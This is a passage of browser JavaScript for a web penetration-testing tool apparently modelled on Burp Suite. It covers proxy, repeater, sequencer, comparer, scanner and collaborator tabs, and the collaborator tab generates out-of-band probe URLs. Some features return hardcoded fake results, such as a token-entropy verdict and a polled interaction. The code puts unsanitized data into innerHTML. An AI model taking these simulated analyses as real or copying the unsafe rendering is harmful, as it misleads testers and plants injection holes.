            document.querySelector(`${selector}[${selector.slice(1, -1)}="${selector.includes('repeater') ? contentId.replace('#repeaterContent', 'repeater') : contentId.match(/[A-Z][a-z]+/)?.[0]?.toLowerCase()}"]`)?.classList.add('active');
            
            // Update active content
            const parent = document.querySelector(selector)?.closest('.tab-content');
            if (parent) {
                parent.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.querySelector(contentId)?.classList.add('active');
            }
        }

        
        
        
        
        

        

        // Load functions for each tab
        async function loadTargetConfig() {
            try {
                const response = await fetch('/api/target/config');
                const config = await response.json();
                
                document.getElementById('targetUrlInput').value = config.url || '';
                document.getElementById('targetScope').value = config.scope?.join('\\n') || '';
                document.getElementById('targetExclusions').value = config.exclusions?.join('\\n') || '';
                document.getElementById('includeSubdomains').checked = config.includeSubdomains || false;
                
            } catch (error) {
                console.error('Error loading target config:', error);
            }
        }
        
        async function loadExtensions() {
            try {
                const response = await fetch('/api/extensions');
                const extensions = await response.json();
                
                // Update extensions list
                const container = document.querySelector('#extenderLoaded .request-list');
                if (container && extensions.length > 0) {
                    container.innerHTML = extensions.map(ext => `
                        <div class="request-item">
                            <div class="request-details">
                                <div class="request-url">${ext.name}</div>
                                <div class="request-meta">
                                    <span>Version: ${ext.version}</span>
                                    <span>Author: ${ext.author}</span>
                                    <span>Status: ${ext.loaded ? 'Loaded' : 'Not Loaded'}</span>
                                </div>
                            </div>
                            <div class="request-actions">
                                <button class="btn btn-icon btn-sm btn-secondary" title="Configure">
                                    <i class="fas fa-cog"></i>
                                </button>
                                <button class="btn btn-icon btn-sm btn-${ext.loaded ? 'danger' : 'success'}" 
                                        title="${ext.loaded ? 'Unload' : 'Load'}"
                                        onclick="${ext.loaded ? 'unloadExtension' : 'loadExtension'}('${ext.id}')">
                                    <i class="fas fa-${ext.loaded ? 'times' : 'check'}"></i>
                                </button>
                            </div>
                        </div>
                    `).join('');
                }
                
            } catch (error) {
                console.error('Error loading extensions:', error);
            }
        }
        
        
        
                // Target Configuration Functions
        async function saveTargetConfig() {
            const url = document.getElementById('targetUrlInput').value;
            const scope = document.getElementById('targetScope').value.split('\\n').filter(line => line.trim());
            const exclusions = document.getElementById('targetExclusions').value.split('\\n').filter(line => line.trim());
            
            try {
                const response = await fetch('/api/target/config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url,
                        scope,
                        exclusions,
                        includeSubdomains: document.getElementById('includeSubdomains').checked,
                        advancedMode: document.getElementById('advancedMode').checked
                    })
                });
                
                const data = await response.json();
                showToast('Target configuration saved successfully', 'success');
                
            } catch (error) {
                console.error('Error saving target config:', error);
                showToast('Failed to save target configuration', 'error');
            }
        }
        
        function clearTarget() {
            if (confirm('Are you sure you want to clear the target configuration?')) {
                document.getElementById('targetUrlInput').value = '';
                document.getElementById('targetScope').value = '';
                document.getElementById('targetExclusions').value = '';
                document.getElementById('includeSubdomains').checked = false;
                document.getElementById('advancedMode').checked = true;
                showToast('Target configuration cleared', 'success');
            }
        }
        
        async function startSpider() {
            const url = document.getElementById('targetUrlInput').value;
            
            if (!url) {
                showToast('Please set a target URL first', 'warning');
                return;
            }
            
            try {
                showToast('Starting spider scan...', 'info');
                
                const response = await fetch('/api/spider/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });
                
                const data = await response.json();
                showToast(`Spider started: Found ${data.urls_found} URLs`, 'success');
                
                // Switch to sitemap tab to see results
                switchTab('sitemap');
                loadSiteMap();
                
            } catch (error) {
                console.error('Error starting spider:', error);
                showToast('Failed to start spider scan', 'error');
            }
        }
        
        // Repeater Helper Functions
        function sendRepeaterRequestFromTab(tabNum) {
            sendRepeaterRequest(tabNum);
        }
        
        function renderResponseFromTab(tabNum) {
            const response = document.getElementById(`repeaterResponse${tabNum}`).value;
            if (response) {
                    const html = extractHtmlBody(response);
                    const win = window.open('', '_blank');
                    win.document.open();
                    win.document.write(html || response);
                    win.document.close();
            }
        }
        
        function extractHtmlBody(rawResponse) {
                const split = rawResponse.split('\\r\\n\\r\\n');
                if (split.length < 2) return '';
                return split.slice(1).join('\\r\\n\\r\\n'); // body only
        }

        
        function beautifyRepeaterRequest(tabNum) {
            const textarea = document.getElementById(`repeaterRequest${tabNum}`);
            const lines = textarea.value.split('\\n');
            let beautified = [];
            let inHeaders = true;
            
            lines.forEach(line => {
                if (line.trim() === '') {
                    inHeaders = false;
                }
                if (inHeaders && line.includes(':') && !line.startsWith(' ')) {
                    const parts = line.split(':');
                    if (parts.length >= 2) {
                        beautified.push(parts[0] + ': ' + parts.slice(1).join(':').trim());
                    } else {
                        beautified.push(line);
                    }
                } else {
                    beautified.push(line);
                }
            });
            
            textarea.value = beautified.join('\\n');
        }
        
        function saveRepeaterRequest() {
            const currentTab = document.querySelector('#repeaterTabs .tab.active');
            const tabNum = currentTab?.dataset.repeaterTab?.replace('repeater', '') || '1';
            const request = document.getElementById(`repeaterRequest${tabNum}`).value;
            
            // Save to local storage or database
            localStorage.setItem(`repeater_tab_${tabNum}`, request);
            showToast('Repeater request saved', 'success');
        }
        
        function closeRepeaterTab() {
            const tabs = document.querySelectorAll('#repeaterTabs .tab');
            if (tabs.length > 1) {
                const currentTab = document.querySelector('#repeaterTabs .tab.active');
                const tabNum = currentTab?.dataset.repeaterTab?.replace('repeater', '');
                
                // Remove tab
                currentTab.remove();
                
                // Remove content
                const content = document.getElementById(`repeaterContent${tabNum}`);
                if (content) content.remove();
                
                // Activate first tab
                const firstTab = document.querySelector('#repeaterTabs .tab');
                if (firstTab) {
                    firstTab.classList.add('active');
                    const firstTabNum = firstTab.dataset.repeaterTab?.replace('repeater', '');
                    document.getElementById(`repeaterContent${firstTabNum}`)?.classList.add('active');
                }
                
                showToast('Repeater tab closed', 'success');
            } else {
                showToast('Cannot close the only tab', 'warning');
            }
        }
        
        // Sequencer Functions
        async function startSequencer() {
            try {
                document.getElementById('startSequencerBtn').disabled = true;
                document.getElementById('stopSequencerBtn').disabled = false;
                document.getElementById('analyzeSequencerBtn').disabled = true;
                
                const progressBar = document.getElementById('sequencerProgress');
                progressBar.style.display = 'block';
                
                // Simulate capture progress
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 5;
                    progressBar.querySelector('.progress-bar').style.width = `${progress}%`;
                    progressBar.querySelector('.progress-bar').textContent = `${progress}%`;
                    
                    if (progress >= 100) {
                        clearInterval(interval);
                        document.getElementById('stopSequencerBtn').disabled = true;
                        document.getElementById('analyzeSequencerBtn').disabled = false;
                        showToast('Sequencer capture complete', 'success');
                    }
                }, 500);
                
            } catch (error) {
                console.error('Error starting sequencer:', error);
                showToast('Failed to start sequencer', 'error');
            }
        }
        
        function stopSequencer() {
            document.getElementById('startSequencerBtn').disabled = false;
            document.getElementById('stopSequencerBtn').disabled = true;
            document.getElementById('sequencerProgress').style.display = 'none';
            showToast('Sequencer stopped', 'warning');
        }
        
        function analyzeSequencer() {
            showToast('Analyzing captured tokens...', 'info');
            // Add analysis logic here
            setTimeout(() => {
                document.getElementById('sequencerAnalysis').innerHTML = `
                    <div class="card">
                        <div class="card-body">
                            <h4>Analysis Results</h4>
                            <p>Tokens analyzed: 100</p>
                            <p>Entropy: 4.2 bits/byte (Good)</p>
                            <p>Predictability: Low</p>
                            <p>Conclusion: Tokens appear to be cryptographically secure</p>
                        </div>
                    </div>
                `;
                showToast('Analysis complete', 'success');
            }, 2000);
        }
        
        function loadManualTokens() {
            const tokens = document.getElementById('manualTokens').value;
            if (tokens.trim()) {
                document.getElementById('sequencerAnalysis').innerHTML = `
                    <div class="card">
                        <div class="card-body">
                            <h4>Manual Tokens Loaded</h4>
                            <p>Tokens loaded: ${tokens.split('\\n').filter(t => t.trim()).length}</p>
                            <p>Ready for analysis</p>
                        </div>
                    </div>
                `;
                showToast('Tokens loaded successfully', 'success');
            } else {
                showToast('Please enter some tokens first', 'warning');
            }
        }
        
        // Comparer Functions
        function compareItems() {
            const item1 = document.getElementById('comparerItem1').value;
            const item2 = document.getElementById('comparerItem2').value;
            
            if (!item1.trim() || !item2.trim()) {
                showToast('Please enter both items to compare', 'warning');
                return;
            }
            
            // Simple diff algorithm
            const lines1 = item1.split('\\n');
            const lines2 = item2.split('\\n');
            let diff = '';
            
            for (let i = 0; i < Math.max(lines1.length, lines2.length); i++) {
                const line1 = lines1[i] || '';
                const line2 = lines2[i] || '';
                
                if (line1 === line2) {
                    diff += `  ${line1}\n`;
                } else {
                    diff += `- ${line1}\n`;
                    diff += `+ ${line2}\n`;
                }
            }
            
            document.getElementById('comparerResults').innerHTML = `
                <div class="code-line">${diff.replace(/\\n/g, '</div><div class="code-line">')}</div>
            `;
            
            showToast('Comparison complete', 'success');
        }
        
        function setDiffMode(mode) {
            document.getElementById('wordDiffBtn').classList.toggle('btn-primary', mode === 'word');
            document.getElementById('charDiffBtn').classList.toggle('btn-primary', mode === 'char');
            showToast(`Diff mode set to: ${mode}`, 'info');
        }
        
        function handleComparerAction(action) {
            switch(action) {
                case 'load1':
                case 'load2':
                    // Implement file loading
                    showToast('File loading not implemented in demo', 'info');
                    break;
                case 'paste1':
                    navigator.clipboard.readText().then(text => {
                        document.getElementById('comparerItem1').value = text;
                        showToast('Pasted from clipboard', 'success');
                    });
                    break;
                case 'paste2':
                    navigator.clipboard.readText().then(text => {
                        document.getElementById('comparerItem2').value = text;
                        showToast('Pasted from clipboard', 'success');
                    });
                    break;
            }
        }
        
        // Extender Functions
        async function loadExtensions() {
            try {
                const response = await fetch('/api/extensions');
                const extensions = await response.json();
                
                const container = document.querySelector('#extenderLoaded .request-list');
                if (container && extensions.length > 0) {
                    container.innerHTML = extensions.map(ext => `
                        <div class="request-item">
                            <div class="request-details">
                                <div class="request-url">${ext.name}</div>
                                <div class="request-meta">
                                    <span>Version: ${ext.version}</span>
                                    <span>Author: ${ext.author}</span>
                                    <span>Status: ${ext.loaded ? 'Loaded' : 'Not Loaded'}</span>
                                </div>
                            </div>
                            <div class="request-actions">
                                <button class="btn btn-icon btn-sm btn-secondary" title="Configure">
                                    <i class="fas fa-cog"></i>
                                </button>
                                <button class="btn btn-icon btn-sm btn-${ext.loaded ? 'danger' : 'success'}" 
                                        title="${ext.loaded ? 'Unload' : 'Load'}"
                                        onclick="${ext.loaded ? 'unloadExtension' : 'loadExtension'}('${ext.id}')">
                                    <i class="fas fa-${ext.loaded ? 'times' : 'check'}"></i>
                                </button>
                            </div>
                        </div>
                    `).join('');
                }
                
                showToast('Extensions loaded', 'success');
            } catch (error) {
                console.error('Error loading extensions:', error);
                showToast('Failed to load extensions', 'error');
            }
        }
        
        function addExtension() {
            showToast('Add extension functionality not implemented in demo', 'info');
        }
        
        async function saveExtenderSettings() {
            try {
                const settings = {
                    apiPort: parseInt(document.getElementById('apiPort').value),
                    extensionDir: document.getElementById('extensionDir').value,
                    autoUpdate: document.getElementById('autoUpdate').checked,
                    loadOnStartup: document.getElementById('loadOnStartup').checked,
                    enableBeta: document.getElementById('enableBeta').checked
                };
                
                await fetch('/api/extender/settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(settings)
                });
                
                showToast('Extender settings saved', 'success');
            } catch (error) {
                console.error('Error saving extender settings:', error);
                showToast('Failed to save extender settings', 'error');
            }
        }
        
        function loadBappStore() {
            document.getElementById('extenderBapp').innerHTML = `
                <div class="request-list">
                    <div class="request-item">
                        <div class="request-details">
                            <div class="request-url">Logger++</div>
                            <div class="request-meta">
                                <span>Version: 2.1.0</span>
                                <span>Rating: 4.8/5</span>
                                <span>Downloads: 15,234</span>
                            </div>
                        </div>
                        <div class="request-actions">
                            <button class="btn btn-sm btn-success">Install</button>
                        </div>
                    </div>
                </div>
            `;
            showToast('BApp Store loaded', 'success');
        }
        
        // Collaborator Functions
        async function startCollaborator() {
            try {
                document.getElementById('startCollaboratorBtn').disabled = true;
                document.getElementById('stopCollaboratorBtn').disabled = false;
                document.getElementById('pollCollaboratorBtn').disabled = false;
                
                const statusBadge = document.getElementById('collaboratorStatus');
                statusBadge.className = 'status-badge success';
                statusBadge.innerHTML = '<i class="fas fa-circle"></i><span>Running</span>';
                
                // Update server uptime
                let seconds = 0;
                const timer = setInterval(() => {
                    seconds++;
                    const mins = Math.floor(seconds / 60);
                    const secs = seconds % 60;
                    document.getElementById('serverUptime').textContent = `Uptime: ${mins}m ${secs}s`;
                }, 1000);
                
                // Store timer for cleanup
                window.collaboratorTimer = timer;
                
                showToast('Collaborator server started', 'success');
            } catch (error) {
                console.error('Error starting collaborator:', error);
                showToast('Failed to start collaborator server', 'error');
            }
        }
        
        function stopCollaborator() {
            document.getElementById('startCollaboratorBtn').disabled = false;
            document.getElementById('stopCollaboratorBtn').disabled = true;
            document.getElementById('pollCollaboratorBtn').disabled = true;
            
            const statusBadge = document.getElementById('collaboratorStatus');
            statusBadge.className = 'status-badge danger';
            statusBadge.innerHTML = '<i class="fas fa-circle"></i><span>Stopped</span>';
            
            // Clear timer
            if (window.collaboratorTimer) {
                clearInterval(window.collaboratorTimer);
                window.collaboratorTimer = null;
            }
            
            document.getElementById('serverUptime').textContent = '-';
            showToast('Collaborator server stopped', 'warning');
        }
        
        function pollCollaborator() {
            document.getElementById('collaboratorInteractions').innerHTML = `
                <div class="request-list">
                    <div class="request-item">
                        <div class="request-details">
                            <div class="request-url">DNS interaction from 192.168.1.100</div>
                            <div class="request-meta">
                                <span>Type: A record</span>
                                <span>Time: Just now</span>
                                <span>Payload: abc123.collaborator.example.com</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            showToast('Polled for interactions - 1 new interaction found', 'success');
        }
        
        function generatePayload() {
            const type = document.getElementById('payloadTypeSelect').value;
            const randomId = Math.random().toString(36).substring(7);
            
            let payload = '';
            switch(type) {
                case 'dns':
                    payload = `${randomId}.collaborator.example.com`;
                    break;
                case 'http':
                    payload = `http://${randomId}.collaborator.example.com/${Math.random().toString(36).substring(2)}`;
                    break;
                case 'https':
                    payload = `https://${randomId}.collaborator.example.com/${Math.random().toString(36).substring(2)}`;
                    break;
                case 'smtp':
                    payload = `mailto:${randomId}@collaborator.example.com`;
                    break;
            }
            
            document.getElementById('generatedPayload').value = payload;
            showToast('Payload generated', 'success');
        }
        
        function copyPayload() {
            const payload = document.getElementById('generatedPayload').value;
            if (payload) {
                navigator.clipboard.writeText(payload);
                showToast('Payload copied to clipboard', 'success');
            }
        }
        
        // Project Functions
        function createNewProject() {
            const projectName = prompt('Enter project name:', 'New Project');
            if (projectName) {
                document.getElementById('projectName').value = projectName;
                document.getElementById('projectFile').value = `./projects/${projectName.toLowerCase().replace(/\\s+/g, '_')}.yetproj`;
                document.getElementById('projectDescription').value = '';
                showToast(`New project "${projectName}" created`, 'success');
            }
        }
        
        function openProject() {
            showToast('Open project functionality not implemented in demo', 'info');
        }
        
        function saveProject() {
            const projectName = document.getElementById('projectName').value;
            showToast(`Project "${projectName}" saved`, 'success');
        }
        
        // Macro Functions
        function createNewMacro() {
            document.getElementById('macroName').value = 'New Macro';
            document.getElementById('macroSteps').innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-list"></i>
                    <h3>No Steps Defined</h3>
                    <p>Add requests to create a macro</p>
                </div>
            `;
            showToast('New macro created', 'success');
        }
        
        function runMacro() {
            showToast('Running macro...', 'info');
            setTimeout(() => {
                showToast('Macro completed successfully', 'success');
            }, 2000);
        }
        
        function startRecordingMacro() {
            document.getElementById('recordMacroBtn').innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
            document.getElementById('recordMacroBtn').className = 'btn btn-sm btn-danger';
            showToast('Started recording macro', 'info');
        }
        
        function addMacroStep() {
            const stepsContainer = document.getElementById('macroSteps');
            const emptyState = stepsContainer.querySelector('.empty-state');
            
            if (emptyState) {
                emptyState.style.display = 'none';
            }
            
            const stepNum = stepsContainer.querySelectorAll('.macro-step').length + 1;
            const step = document.createElement('div');
            step.className = 'macro-step request-item';
            step.innerHTML = `
                <div class="request-details">
                    <div class="request-url">Step ${stepNum}: GET /login</div>
                    <div class="request-meta">
                        <span>Status: 200 OK</span>
                        <span>Size: 1.2KB</span>
                    </div>
                </div>
                <div class="request-actions">
                    <button class="btn btn-icon btn-sm btn-secondary" title="Edit">
                        <i class="fas fa-edit"></i>
                    </button>
                    <button class="btn btn-icon btn-sm btn-danger" title="Remove">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            `;
            
            stepsContainer.appendChild(step);
            showToast('Step added to macro', 'success');
        }
        
        // Session Functions
        async function loadSessions() {
            // Simulate loading sessions
            showToast('Sessions loaded', 'success');
        }
        
        function clearSessions() {
            if (confirm('Are you sure you want to clear all sessions?')) {
                showToast('All sessions cleared', 'success');
            }
        }
        
        function exportCookies() {
            const cookies = document.getElementById('cookieJar').value;
            const blob = new Blob([cookies], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'cookies.txt';
            a.click();
            showToast('Cookies exported', 'success');
        }
        
        function importCookies() {
            showToast('Import cookies functionality not implemented in demo', 'info');
        }
        
        function clearCookies() {
            if (confirm('Are you sure you want to clear all cookies?')) {
                document.getElementById('cookieJar').value = '';
                showToast('All cookies cleared', 'success');
            }
        }
        
        // Log Functions
        async function refreshLogs() {
            showToast('Logs refreshed', 'success');
        }
        
        function exportLogs() {
            showToast('Export logs functionality not implemented in demo', 'info');
        }
        
        function clearLogs() {
            if (confirm('Are you sure you want to clear all logs?')) {
                ['appLogContent', 'proxyLogContent', 'scannerLogContent', 'extensionsLogContent'].forEach(id => {
                    document.getElementById(id).textContent = '[Logs cleared]';
                });
                showToast('All logs cleared', 'success');
            }
        }
        
        // Help Functions
        function openDocumentation() {
            window.open('https://docs.yettie.com', '_blank');
        }
        
        function openTutorials() {
            window.open('https://tutorials.yettie.com', '_blank');
        }
        
        function openSupport() {
            window.open('mailto:support@yettie.com');
        }
        
        function checkForUpdates() {
            showToast('Checking for updates...', 'info');
            setTimeout(() => {
                showToast('You have the latest version', 'success');
            }, 1500);
        }
        
        function showLicenseInfo() {
            alert('Yettie Professional v3.0\\nLicense: Professional Edition\\nExpires: Never\\nUser: Security Tester');
        }
        
        // Load functions for each tab
        async function loadTargetConfig() {
            try {
                const response = await fetch('/api/target/config');
                const config = await response.json();
                
                document.getElementById('targetUrlInput').value = config.url || '';
                document.getElementById('targetScope').value = config.scope?.join('\\n') || '';
                document.getElementById('targetExclusions').value = config.exclusions?.join('\\n') || '';
                document.getElementById('includeSubdomains').checked = config.includeSubdomains || false;
                
            } catch (error) {
                console.error('Error loading target config:', error);
            }
        }
        
        
        
        function clearSiteMap() {
            if (confirm('Are you sure you want to clear the site map?')) {
                const treeContainer = document.querySelectorAll('.siteMapTree');
                if (!treeContainer) return;
                treeContainer.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-sitemap"></i>
                        <h3>No Site Map</h3>
                        <p>Set a target and start browsing to build the site map</p>
                    </div>
                `;
                showToast('Site map cleared', 'success');
            }
        }
        
        function exportSiteMap() {
            showToast('Site map exported successfully', 'success');
        }
        
        function loadSequencerData() {
            // Load sequencer data
            showToast('Sequencer data loaded', 'success');
        }
        
        function loadCollaboratorStatus() {
            // Load collaborator status
            showToast('Collaborator status loaded', 'success');
        }
        
        function loadProjects() {
            // Load projects list
            showToast('Projects loaded', 'success');
        }
        
        function loadMacros() {
            // Load macros
            showToast('Macros loaded', 'success');
        }
        
        function loadSettings() {
            // Load saved settings
            showToast('Settings loaded', 'success');
        }
        
        function loadLogs() {
            // Load logs
            showToast('Logs loaded', 'success');
        }
        
        function loadHelp() {
            // Load help content
            document.getElementById('systemInfo').textContent = 
                `Browser: ${navigator.userAgent}\n` +
                `Platform: ${navigator.platform}\n` +
                `Screen: ${screen.width}x${screen.height}`;
            showToast('Help content loaded', 'success');
        }

        

        function initializeTooltips() {
            // Initialize tooltips for buttons
            const tooltips = {
                'interceptToggle': 'Toggle request/response interception',
                'exportBtn': 'Export data in various formats',
                'newScanBtn': 'Start a new vulnerability scan',
                'clearBtn': 'Clear all captured data',
                'sidebarToggleBtn': 'Toggle sidebar'
            };

            for (const [id, text] of Object.entries(tooltips)) {
                const element = document.getElementById(id);
                if (element) {
                    element.title = text;
                }
            }
        }

        function initializeCharts() {
            // Request Timeline Chart
            const requestCtx = document.getElementById('requestChart')?.getContext('2d');
            if (requestCtx) {
                charts.requestChart = new Chart(requestCtx, {
                    type: 'line',
                    data: {
                        labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
                        datasets: [{
                            label: 'Requests',
                            data: [12, 19, 3, 5, 2, 3],
                            borderColor: '#4a6ee0',
                            backgroundColor: 'rgba(74, 110, 224, 0.1)',
                            fill: true,
                            tension: 0.4,
                            borderWidth: 2
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                display: false
                            },
                            tooltip: {
                                mode: 'index',
                                intersect: false
                            }
                        },
                        scales: {
                            x: {
                                grid: {
                                    display: false
                                }
                            },
                            y: {
                                beginAtZero: true,
                                grid: {
                                    color: 'rgba(0,0,0,0.05)'
                                }
                            }
                        }
                    }
                });
            }

            // Issue Distribution Chart
            const issueCtx = document.getElementById('issueChart')?.getContext('2d');
            if (issueCtx) {
                charts.issueChart = new Chart(issueCtx, {
                    type: 'doughnut',
                    data: {
                        labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
                        datasets: [{
                            data: [2, 5, 8, 12, 15],
                            backgroundColor: [
                                '#dc3545',
                                '#fd7e14',
                                '#ffc107',
                                '#20c997',
                                '#0dcaf0'
                            ],
                            borderWidth: 0
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: true,
                        aspectRatio: 1,   // perfect square
                        plugins: {
                            legend: {
                                position: 'bottom',
                                labels: {
                                    boxWidth: 12,
                                    padding: 10
                                }
                            }
                        },
                        cutout: '65%'
                    }
                });
            }
        }

        function switchTab(tabName) {
            // Update active tab in sidebar
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('active');
            });
            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

            // Update active content
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(`${tabName}Tab`).classList.add('active');

            // Load tab content
            currentTab = tabName;
            switch (tabName) {
                case 'dashboard':
                    loadDashboard();
                    break;
                case 'proxy':
                    loadRequests();
                    break;
                case 'scanner':
                    loadScanResults();
                    break;
                case 'intruder':
                    loadIntruderJobs();
                    switchIntruderTab('positions');
                    break;
                case 'decoder':
                    // Nothing to load
                    break;
                case 'sitemap':
                    loadSiteMap();
                    break;
                case 'target':
                    loadTargetConfig();
                    break;
                case 'repeater':
                    // Nothing to load
                    switchRepeaterTab('1');
                    break;
                case 'sequencer':
                    loadSequencerData();
                    switchSequencerTab('live');
                    break;
                case 'comparer':
                    // Nothing to load
                    break;
                case 'extender':
                    loadExtensions();
                    switchExtenderTab('loaded');
                    break;
                case 'collaborator':
                    loadCollaboratorStatus();
                    switchCollaboratorTab('server');
                    break;
                case 'projects':
                    loadProjects();
                    break;
                case 'macros':
                    loadMacros();
                    switchMacroTab('list');
                    break;
                case 'sessions':
                    loadSessions();
                    switchSessionTab('sessions');
                    break;
                case 'settings':
                    loadSettings();
                    switchSettingsTab('general');
                    break;
                case 'logs':
                    loadLogs();
                    switchLogTab('application');
                    break;
                case 'help':
                    loadHelp();
                    switchHelpTab('started');
                    break;
                default:
                    console.log(`Switched to ${tabName} tab`);
            }
        }

        function switchIntruderTab(tabName) {
            // Update active tab
            document.querySelectorAll('[data-intruder-tab]').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelector(`[data-intruder-tab="${tabName}"]`).classList.add('active');

            // Update active content
            document.querySelectorAll('#intruderTab .tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(`intruder${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
        }

        function switchDetailTab(tabName) {
            // Update active tab
            document.querySelectorAll('[data-detail-tab]').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelector(`[data-detail-tab="${tabName}"]`).classList.add('active');

            // Update active content
            document.querySelectorAll('#requestDetailModal .tab-content').forEach(content => {
                content.classList.remove('active');
            });
            document.getElementById(`detail${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
        }

        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            const toggleIcon = document.querySelector('#sidebarToggle i');

            sidebar.classList.toggle('collapsed');

            if (sidebar.classList.contains('collapsed')) {
                toggleIcon.classList.remove('fa-chevron-left');
                toggleIcon.classList.add('fa-chevron-right');
            } else {
                toggleIcon.classList.remove('fa-chevron-right');
                toggleIcon.classList.add('fa-chevron-left');
            }
        }

        async function loadDashboard() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();

                // Update stats
                document.getElementById('totalRequests').textContent = data.proxy?.stats?.requests_processed || 0;
                document.getElementById('totalIssues').textContent = '0'; // Will be updated from scanner
                document.getElementById('coverageRate').textContent = '0%';
                document.getElementById('activeTime').textContent = '0m';

                // Update status badges
                const proxyStatus = document.getElementById('proxyStatus');
                proxyStatus.className = `status-badge ${data.proxy?.running ? 'success' : 'danger'}`;
                proxyStatus.innerHTML = `<i class="fas fa-circle"></i><span>Proxy: ${data.proxy?.running ? 'Running' : 'Stopped'}</span>`;

                // Update request count
                document.getElementById('requestCount').innerHTML = 
                    `<i class="fas fa-exchange-alt"></i><span>Requests: ${data.proxy?.stats?.requests_processed || 0}</span>`;

                // Load activity
                loadActivity();

            } catch (error) {
                console.error('Error loading dashboard:', error);
            }
        }

        async function loadRequests() {
            try {
                const response = await fetch('/api/requests');
                const requests = await response.json();

                const requestList = document.getElementById('requestList');
                const emptyState = document.getElementById('emptyRequests');

                if (!requests || requests.length === 0) {
                    requestList.style.display = 'none';
                    emptyState.style.display = 'block';
                    return;
                }

                emptyState.style.display = 'none';
                requestList.style.display = 'block';

                requestList.innerHTML = '';

                requests.forEach(request => {
                    const methodClass = request.method.toLowerCase();
                    const statusClass = request.code >= 200 && request.code < 300 ? 'success' : 
                                       request.code >= 400 ? 'error' : 'warning';

                    const requestItem = document.createElement('div');
                    requestItem.className = 'request-item';
                    requestItem.dataset.id = request.id;
                    requestItem.innerHTML = `
                        <div class="method-badge ${methodClass}">${request.method}</div>
                        <div class="request-details">
                            <div class="request-url">${request.host}${request.path}</div>
                            <div class="request-meta">
                                <span class="status-code ${statusClass}">${request.code}</span>
                                <span>${request.response_time}ms</span>
                                <span>${formatBytes(request.request_size + request.response_size)}</span>
                                <span>${formatTime(request.timestamp)}</span>
                            </div>
                        </div>
                        <div class="request-actions">
                            <button class="btn btn-icon btn-sm btn-secondary" onclick="viewRequest('${request.id}')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-icon btn-sm btn-secondary" onclick="sendToRepeater('${request.id}')">
                                <i class="fas fa-redo"></i>
                            </button>
                            <button class="btn btn-icon btn-sm btn-secondary" onclick="sendToIntruder('${request.id}')">
                                <i class="fas fa-fighter-jet"></i>
                            </button>
                        </div>
                    `;

                    requestItem.addEventListener('click', (e) => {
                        if (!e.target.closest('.request-actions')) {
                            viewRequest(request.id);
                        }
                    });

                    requestList.appendChild(requestItem);
                });

            } catch (error) {
                console.error('Error loading requests:', error);
                document.getElementById('emptyRequests').style.display = 'block';
            }
        }
        
        
        async function apiGet(endpoint, params = {}) {
            const query = new URLSearchParams();

            Object.entries(params).forEach(([key, value]) => {
                if (value !== null && value !== undefined && value !== '') {
                    query.append(key, value);
                }
            });

            const url = query.toString()
                ? `${endpoint}?${query.toString()}`
                : endpoint;

            const response = await fetch(url);

            if (!response.ok) {
                throw new Error(`API error ${response.status}`);
            }

            return response.json();
        }
        
        function getScannerResults({
             project = project_id,
             severity = null,
             status = null,
            limit = 100
        } = {}) {
            return apiGet('/api/scanner/results', {
               project,
              severity,
              status,
              limit
            });
        }




        async function loadScanResults() {
            try {
                const results = await getScannerResults();

                const resultsList = document.getElementById('scanResults');
                const emptyState = document.getElementById('emptyScanResults');

                if (!results || results.length === 0) {
                    resultsList.style.display = 'none';
                    emptyState.style.display = 'block';
                    return;
                }

                emptyState.style.display = 'none';
                resultsList.style.display = 'block';

                resultsList.innerHTML = '';

                results.forEach(result => {
                    const severityClass = result.severity.toLowerCase();

                    const resultItem = document.createElement('div');
                    resultItem.className = 'request-item';
                    resultItem.innerHTML = `
                        <div class="severity-badge severity-${severityClass}">${result.severity}</div>
                        <div class="request-details">
                            <div class="request-url">${result.type} - ${result.url}</div>
                            <div class="request-meta">
                                <span>${result.description}</span>
                                <span>Confidence: ${result.confidence}</span>
                                <span>CVSS: ${result.cvss_score}</span>
                                <span>${formatTime(result.timestamp)}</span>
                            </div>
                        </div>
                        <div class="request-actions">
                            <button class="btn btn-icon btn-sm btn-success" onclick="markAsFixed('${result.id}')">
                                <i class="fas fa-check"></i>
                            </button>
                            <button class="btn btn-icon btn-sm btn-danger" onclick="markAsFalsePositive('${result.id}')">
                                <i class="fas fa-times"></i>
                            </button>
                            <button class="btn btn-icon btn-sm btn-secondary" onclick="viewScanResult('${result.id}')">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                    `;

                    resultsList.appendChild(resultItem);
                });

                // Update issue count
                document.getElementById('totalIssues').textContent = results.length;
                document.getElementById('issueCount').innerHTML = 
                    `<i class="fas fa-exclamation-triangle"></i><span>Issues: ${results.length}</span>`;

            } catch (error) {
                console.error('Error loading scan results:', error);
                document.getElementById('emptyScanResults').style.display = 'block';
            }
        }

        async function loadIntruderJobs() {
            try {
                const params = new URLSearchParams({
                    project: project_id,
